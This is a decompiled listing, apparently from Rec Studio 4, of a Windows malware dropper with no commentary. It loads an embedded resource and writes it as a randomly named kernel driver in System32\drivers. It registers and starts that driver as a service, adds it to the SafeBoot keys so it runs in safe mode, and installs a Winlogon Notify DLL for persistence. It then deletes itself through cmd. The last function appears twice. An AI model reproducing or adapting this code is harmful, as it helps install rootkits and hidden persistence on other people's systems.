// Generated by Rec Studio 4 - build Sep 23 2015

L08001340(
    _unknown_ __ecx,                       // r2
    char* _a4,                             // _cfa_4
    intOrPtr* _a8,                         // _cfa_8
    intOrPtr _a12                          // _cfa_c
)
{
    char* _v8;                             // _cfa_fffffff8

    _push(__ecx);
    _v8 = _a4;
    while(1) {
        _a12 = _a12 - 1;
        if(_a12 == 0) {
            break;
        }
         *_a4 =  *_a8;
        _a4 = _a4 + 1;
        _a8 = _a8 + 1;
    }
    return _v8;
}

L08001390(
    _unknown_ __ecx,                       // r2
    char* _a4,                             // _cfa_4
    char _a8,                              // _cfa_8
    intOrPtr _a12                          // _cfa_c
)
{
    char* _v8;                             // _cfa_fffffff8

    _push(__ecx);
    _v8 = _a4;
    while(1) {
        _a12 = _a12 - 1;
        if(_a12 == 0) {
            break;
        }
         *_a4 = _a8;
        _a4 = _a4 + 1;
    }
    return _v8;
}

L080013D0(
    intOrPtr __eax,                        // r0
    intOrPtr _a4                           // _cfa_4
)
{
    intOrPtr _t4;                          // _t4

    if( *134230024 == 0) {
        __imp__GetProcessHeap();
         *134230024 = __eax;
    }
    if( *134230024 == 0) {
        return 0;
    } else {
        _t4 = _a4;
        _push(_t4);
        _push(0);
        _push( *134230024);
        __imp__HeapAlloc();
        return _t4;
    }
}

L08001420(
    intOrPtr _a4                           // _cfa_4
)
{
    _unknown_ _t2;                         // _t2
    intOrPtr _t3;                          // _t3

    if( *134230024 != 0) {
        _t3 = _a4;
        _push(_t3);
        _push(0);
        _push( *134230024);
        __imp__HeapFree();
        return _t3;
    }
    return _t2;
}

L08001450(
    _unknown_ __ebx,                       // r1
    _unknown_ __esi                        // r5
)
{
    signed int _v8;                        // _cfa_fffffff8
    char _v276;                            // _cfa_fffffeec
    char _v292;                            // _cfa_fffffedc
    char* _v296;                           // _cfa_fffffed8
    char _v368;                            // _cfa_fffffe90
    char _v372;                            // _cfa_fffffe8c
    char _v635;                            // _cfa_fffffd85
    char _v636;                            // _cfa_fffffd84
    _unknown_ _t28;                        // _t28
    char _t29;                             // _t29
    intOrPtr _t30;                         // _t30

    __esi = __esi;
    __ebx = __ebx;
    _v8 =  *134230016 ^ __ebp;
    _v296 =  &_v636;
    _v372 = 68;
    _t28 = L08001390( &_v368,  &_v368, 0, 64);
    __imp__GetCommandLineA();
    _push(_t28);
    _t44 =  &_v636;
    _push( &_v636);
    __imp__lstrcpyA();
    _t29 = _v636;
    if(_t29 == 34) {
        _push( &_v636);
        __imp__lstrlenA();
         *((char*)(__ebp + _t29 - 634)) = 0;
        _t44 =  &_v635;
        _v296 =  &_v635;
    }
    _push(260);
    _t30 = _v296;
    _push(_t30);
    _push(_v296);
    __imp__GetShortPathNameA();
    if(_t30 != 0) {
        _push("/c del ");
        _push( &_v276);
        __imp__lstrcpyA();
        _push(_v296);
        _push( &_v276);
        __imp__lstrcatA();
        _push(" >> NUL");
        _push( &_v276);
        __imp__lstrcatA();
        _push(260);
        _push(_v296);
        _push("ComSpec");
        __imp__GetEnvironmentVariableA();
        _push( &_v292);
        _t44 =  &_v372;
        _push( &_v372);
        _push(0);
        _push(0);
        _push(134217728);
        _push(0);
        _push(0);
        _push(0);
        _push( &_v276);
        _push(_v296);
        __imp__CreateProcessA();
        if( &_v276 != 0) {
            _push(0);
            __imp__ExitProcess();
        }
    }
    return L08001FF8(0, __ebx, _v8 ^ __ebp, _t44, __esi);
}

signed int L080015A0(
    signed int _a4,                        // _cfa_4
    signed short _a8,                      // _cfa_8
    intOrPtr _a12,                         // _cfa_c
    signed int* _a16                       // _cfa_10
)
{
    signed int _v8;                        // _cfa_fffffff8
    signed int _v12;                       // _cfa_fffffff4
    signed int _v16;                       // _cfa_fffffff0
    signed int _v20;                       // _cfa_ffffffec
    signed int _v24;                       // _cfa_ffffffe8
    signed int _t30;                       // _t30
    signed int _t31;                       // _t31

    _v16 = 0;
    _v8 = 0;
    if(_a8 == 0) {
        if(_a12 != 0) {
            _push("BIN");
            _push(_a12);
            _t30 = _a4;
            _push(_t30);
            __imp__FindResourceA();
            _v8 = _t30;
        }
    } else {
        _push("BIN");
        _t30 = _a8 & 65535;
        _push(_t30);
        _push(_a4);
        __imp__FindResourceA();
        _v8 = _t30;
    }
    _push(_v8);
    _push(_a4);
    __imp__LoadResource();
    _v20 = _t30;
    _t31 = _v8;
    _push(_t31);
    _push(_a4);
    __imp__SizeofResource();
    _v12 = _t31;
    if(_v20 != 0) {
        _push(_v20);
        __imp__LockResource();
        _v24 = _t31;
        if(_v24 != 0) {
             *_a16 = _v12;
            _v16 = L080013D0(_a16, _v12);
            L08001340(_v24, _v16, _v24, _v12);
        }
        _push(_v20);
        __imp__FreeResource();
    }
    return _v16;
}

L08001670(
    _unknown_ __ecx,                       // r2
    intOrPtr _a4,                          // _cfa_4
    intOrPtr _a8,                          // _cfa_8
    char _a12                              // _cfa_c
)
{
    intOrPtr _v8;                          // _cfa_fffffff8
    intOrPtr _t12;                         // _t12

    _push(__ecx);
    if(_a8 == 0 || _a12 == 0) {
L4:
        return 0;
    } else {
        _push(0);
        _push(128);
        _push(2);
        _push(0);
        _push(0);
        _push(1073741824);
        _t12 = _a4;
        _push(_t12);
        __imp__CreateFileA();
        _v8 = _t12;
        if(_v8 == -1) {
            goto L4;
        }
        _push(0);
        _push( &_a12);
        _push(_a12);
        _push(_a8);
        _push(_v8);
        __imp__WriteFile();
        _push(_v8);
        __imp__CloseHandle();
        return 1;
    }
}

L080016E0()
{
    char _v12;                             // _cfa_fffffff4

    _push( &_v12);
    __imp__QueryPerformanceCounter();
    return _v12;
}

L08001700(
    intOrPtr _a4,                          // _cfa_4
    char* _a8                              // _cfa_8
)
{
    signed short _t37;                     // _t37
    signed short _t41;                     // _t41
    signed short _t45;                     // _t45
    signed short _t49;                     // _t49
    signed short _t53;                     // _t53
    intOrPtr _t58;                         // _t58

    _t37 = L080016E0();
    asm("cdq");
     *_a8 = (_t37 & 65535) % 25 + 65;
    _t41 = L080016E0();
    asm("cdq");
     *((char*)(_a8 + 1)) = (_t41 & 65535) % 25 + 97;
    _t45 = L080016E0();
    asm("cdq");
     *((char*)(_a8 + 2)) = (_t45 & 65535) % 25 + 97;
    _t49 = L080016E0();
    asm("cdq");
     *((char*)(_a8 + 3)) = (_t49 & 65535) % 9 + 48;
    _t53 = L080016E0();
    asm("cdq");
     *((char*)(_a8 + 4)) = (_t53 & 65535) % 9 + 48;
     *((char*)(_a8 + 5)) = 0;
    _push(260);
    _push(_a4);
    _push("SystemRoot");
    __imp__GetEnvironmentVariableA();
    _push("\\System32\\drivers\\");
    _push(_a4);
    __imp__lstrcatA();
    _push(_a8);
    _push(_a4);
    __imp__lstrcatA();
    _push(".sys");
    _t58 = _a4;
    _push(_t58);
    __imp__lstrcatA();
    return _t58;
}

L080017E0(
    intOrPtr _a4                           // _cfa_4
)
{
    _push(260);
    __eax = _a4;
    _push(__eax);
    _push("SystemRoot");
    __imp__GetEnvironmentVariableA();
    _push("\\System32\\WinNt32.dll");
    _push(_a4);
    __imp__lstrcatA();
    return __eax;
}

L08001820(
    intOrPtr __eax,                        // r0
    intOrPtr _a4,                          // _cfa_4
    intOrPtr _a8                           // _cfa_8
)
{
    intOrPtr _v8;                          // _cfa_fffffff8
    intOrPtr _v12;                         // _cfa_fffffff4
    intOrPtr _v16;                         // _cfa_fffffff0
    intOrPtr _v20;                         // _cfa_ffffffec
    intOrPtr _t22;                         // _t22

    _v12 = 1;
    _push(983103);
    _push(0);
    _push(0);
    __imp__OpenSCManagerA();
    _v20 = __eax;
    _push(983551);
    _t22 = _a8;
    _push(_t22);
    _push(_v20);
    __imp__OpenServiceA();
    _v8 = _t22;
    if(_v8 == 0) {
        _push(0);
        _push(0);
        _push(0);
        _push(0);
        _push(0);
        _push(_a4);
        _push(0);
        _push(3);
        _push(1);
        _push(983551);
        _push(0);
        _t22 = _a8;
        _push(_t22);
        _push(_v20);
        __imp__CreateServiceA();
        _v8 = _t22;
    }
    if(_v8 == 0) {
L5:
        __imp__GetLastError();
        _v16 = _t22;
        if(_v16 != 1056) {
            _v12 = 0;
        } else {
            _v12 = 1;
        }
        goto L8;
    } else {
        _push(0);
        _push(0);
        _push(_v8);
        __imp__StartServiceA();
        if(_t22 == 0) {
            goto L5;
        }
        _v12 = 1;
L8:
        if(_v8 != 0) {
            _push(_v8);
            __imp__CloseServiceHandle();
        }
        return _v12;
    }
}

L080018F0(
    intOrPtr _a4                           // _cfa_4
)
{
    signed int _v8;                        // _cfa_fffffff8
    char _v268;                            // _cfa_fffffef4
    char _v524;                            // _cfa_fffffdf4
    char _v528;                            // _cfa_fffffdf0

    _v8 =  *134230016 ^ __ebp;
    _push("SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\");
    _push( &_v524);
    __imp__lstrcpyA();
    _push(_a4);
    _push( &_v524);
    __imp__lstrcatA();
    _push(".sys");
    _push( &_v524);
    __imp__lstrcatA();
    _push("SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\");
    _push( &_v268);
    __imp__lstrcpyA();
    _push(_a4);
    _push( &_v268);
    __imp__lstrcatA();
    _push(".sys");
    _push( &_v268);
    __imp__lstrcatA();
    _push( &_v528);
    _push( &_v524);
    _push(-2147483646);
    __imp__RegCreateKeyA();
    _push(8);
    _push("Driver");
    _push(1);
    _push(0);
    _push(_v528);
    __imp__RegSetValueA();
    _push(_v528);
    __imp__RegCloseKey();
    _push( &_v528);
    _push( &_v268);
    _push(-2147483646);
    __imp__RegCreateKeyA();
    _push(8);
    _push("Driver");
    _push(1);
    _push(0);
    _push(_v528);
    __imp__RegSetValueA();
    _push(_v528);
    __imp__RegCloseKey();
    return L08001FF8(_v528, __ebx, _v8 ^ __ebp, _v528, __esi);
}

L08001A00(
    _unknown_ __ebx,                       // r1
    _unknown_ __esi,                       // r5
    intOrPtr _a4,                          // _cfa_4
    intOrPtr _a8                           // _cfa_8
)
{
    char _v8;                              // _cfa_fffffff8
    signed int _v12;                       // _cfa_fffffff4
    char _v257;                            // _cfa_fffffeff
    char _v258;                            // _cfa_fffffefe
    short _v260;                           // _cfa_fffffefc
    intOrPtr _v264;                        // _cfa_fffffef8
    char _v268;                            // _cfa_fffffef4
    char _v524;                            // _cfa_fffffdf4
    char _v528;                            // _cfa_fffffdf0
    char _v788;                            // _cfa_fffffcec
    char _v792;                            // _cfa_fffffce8
    _unknown_ _t42;                        // _t42

    __esi = __esi;
    __ebx = __ebx;
    _v12 =  *134230016 ^ __ebp;
    _push(_a8);
    _push( &_v524);
    __imp__lstrcpyA();
    _push(_a4);
    _push( &_v524);
    __imp__lstrcatA();
    _push( &_v528);
    _push( &_v524);
    _push(-2147483646);
    __imp__RegCreateKeyA();
    _v792 = 1;
    _push(4);
    _push( &_v792);
    _push(4);
    _push(0);
    _push("Type");
    _push(_v528);
    __imp__RegSetValueExA();
    _v8 = 0;
    _push(4);
    _push( &_v8);
    _push(4);
    _push(0);
    _push("Start");
    _push(_v528);
    __imp__RegSetValueExA();
    _push("System32\\Drivers\\");
    _push( &_v788);
    __imp__lstrcpyA();
    _push(_a4);
    _push( &_v788);
    __imp__lstrcatA();
    _push(".sys");
    _push( &_v788);
    __imp__lstrcatA();
    _push( &_v788);
    __imp__lstrlenA();
    _push( &_v788 + 1);
    _push( &_v788);
    _push(1);
    _push(0);
    _push("ImagePath");
    _push(_v528);
    __imp__RegSetValueExA();
    _v268 = "SCSI Class";
    _v264 = M080011A4;
    _v260 =  *134222248;
    _v258 =  *134222250;
    _t42 = L08001390( *134222248,  &_v257, 0, 245);
    _push( &_v268);
    __imp__lstrlenA();
    _push(_t42 + 1);
    _push( &_v268);
    _push(1);
    _push(0);
    _push("Group");
    _push(_v528);
    __imp__RegSetValueExA();
    _push(_v528);
    __imp__RegCloseKey();
    return L08001FF8(_v528, __ebx, _v12 ^ __ebp,  &_v268, __esi);
}

L08001BA0()
{
    char _v8;                              // _cfa_fffffff8
    char _v12;                             // _cfa_fffffff4
    char* _v16;                            // _cfa_fffffff0
    char* _v20;                            // _cfa_ffffffec
    char _v24;                             // _cfa_ffffffe8
    intOrPtr _t19;                         // _t19

    _v20 = "WinNt32.dll";
    _v16 = "WLEventStartShell";
    _v8 = 0;
    _v24 = 0;
    _push( &_v12);
    _push("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\WinNt32");
    _push(-2147483646);
    __imp__RegCreateKeyA();
    _push(_v20);
    __imp__lstrlenA();
    _push( &_v12 + 1);
    _push(_v20);
    _push(1);
    _push(0);
    _push("DLLName");
    _t19 = _v12;
    _push(_t19);
    __imp__RegSetValueExA();
    _push(_v16);
    __imp__lstrlenA();
    _push(_t19 + 1);
    _push(_v16);
    _push(1);
    _push(0);
    _push("StartShell");
    _push(_v12);
    __imp__RegSetValueExA();
    _push(4);
    _push( &_v8);
    _push(4);
    _push(0);
    _push("Impersonate");
    _push(_v12);
    __imp__RegSetValueExA();
    _push(4);
    _push( &_v24);
    _push(4);
    _push(0);
    _push("Asynchronous");
    _push(_v12);
    __imp__RegSetValueExA();
    _push(_v12);
    __imp__RegCloseKey();
    return  &_v24;
}

L08001C70(
    _unknown_ __eax                        // r0
)
{
    __eax = __eax;
    _push(0);
    _push(128);
    _push(2);
    _push(0);
    _push(0);
    _push(-1073741824);
    _push("\\\\.\\Prot2");
    __imp__CreateFileA();
    return __eax;
}

L08001FF8(
    intOrPtr __eax,                        // r0
    intOrPtr __ebx,                        // r1
    intOrPtr __ecx,                        // r2
    intOrPtr __edx,                        // r3
    intOrPtr __esi                         // r5
)
{
    char _v0;                              // _cfa_0
    intOrPtr _v8;                          // _cfa_fffffff8
    intOrPtr _v804;                        // _cfa_fffffcdc
    _unknown_ __edi;                       // r4
    char _t9;                              // _t9
    intOrPtr _t11;                         // _t11
    intOrPtr _t17;                         // _t17
    intOrPtr _t19;                         // _t19
    _unknown_ _t20;                        // _t20
    _unknown_ _t21;                        // _t21

    __esi = __esi;
    __edx = __edx;
    __ebx = __ebx;
    if(__ecx ==  *134230016) {
        asm("repe ret");
    }
    _push(_t20);
    _t21 = __esp;
    __esp = __esp - 800;
    _push(_t17);
     *134230288 = __eax;
     *134230284 = __ecx;
     *134230280 = __edx;
     *134230276 = __ebx;
     *134230272 = __esi;
     *134230268 = _t17;
     *134230312 = ss;
     *134230300 = cs;
     *134230264 = ds;
     *134230260 = es;
     *134230256 = fs;
     *134230252 = gs;
    asm("pushfd");
    _pop( *134230304);
    _t9 = _v0;
     *134230308 =  &_v0 + 4;
     *134230296 = _t9;
     *134230112 = 65537;
     *134230044 = _t9;
     *134230292 =  *((intOrPtr*)( &_v0 - 4));
     *134230032 = -1073740791;
    _t19 = 1;
     *134230036 = _t19;
    _v8 =  *134230016;
    _t11 =  *134230020;
    _v8 = _t11;
    _push(0);
    __imp__SetUnhandledExceptionFilter();
    _push(134222536);
    __imp__UnhandledExceptionFilter();
    _push(-1073740791);
    _v804 = _t19;
    __imp__GetCurrentProcess();
    _push(_t11);
    __imp__TerminateProcess();
    _pop(__edi);
    __esp = _t21;
    _pop(__ebp);
    return _t11;
}

L08001FF8(
    intOrPtr __eax,                        // r0
    intOrPtr __ebx,                        // r1
    intOrPtr __ecx,                        // r2
    intOrPtr __edx,                        // r3
    intOrPtr __esi                         // r5
)
{
    char _v0;                              // _cfa_0
    intOrPtr _v8;                          // _cfa_fffffff8
    intOrPtr _v804;                        // _cfa_fffffcdc
    _unknown_ __edi;                       // r4
    char _t9;                              // _t9
    intOrPtr _t11;                         // _t11
    intOrPtr _t17;                         // _t17
    intOrPtr _t19;                         // _t19
    _unknown_ _t20;                        // _t20
    _unknown_ _t21;                        // _t21

    __esi = __esi;
    __edx = __edx;
    __ebx = __ebx;
    if(__ecx ==  *134230016) {
        asm("repe ret");
    }
    _push(_t20);
    _t21 = __esp;
    __esp = __esp - 800;
    _push(_t17);
     *134230288 = __eax;
     *134230284 = __ecx;
     *134230280 = __edx;
     *134230276 = __ebx;
     *134230272 = __esi;
     *134230268 = _t17;
     *134230312 = ss;
     *134230300 = cs;
     *134230264 = ds;
     *134230260 = es;
     *134230256 = fs;
     *134230252 = gs;
    asm("pushfd");
    _pop( *134230304);
    _t9 = _v0;
     *134230308 =  &_v0 + 4;
     *134230296 = _t9;
     *134230112 = 65537;
     *134230044 = _t9;
     *134230292 =  *((intOrPtr*)( &_v0 - 4));
     *134230032 = -1073740791;
    _t19 = 1;
     *134230036 = _t19;
    _v8 =  *134230016;
    _t11 =  *134230020;
    _v8 = _t11;
    _push(0);
    __imp__SetUnhandledExceptionFilter();
    _push(134222536);
    __imp__UnhandledExceptionFilter();
    _push(-1073740791);
    _v804 = _t19;
    __imp__GetCurrentProcess();
    _push(_t11);
    __imp__TerminateProcess();
    _pop(__edi);
    __esp = _t21;
    _pop(__ebp);
    return _t11;
}

// Statistics:
//      50 Register nodes
//      74 Temporaries nodes
//       7 Casts
//     314 Statements
//       6 Labels
//       3 Gotos
//      16 Blocks
//    1310 Nodes
//       7 Assembly nodes
//      14 Unknown Types


Total time: 0 seconds.
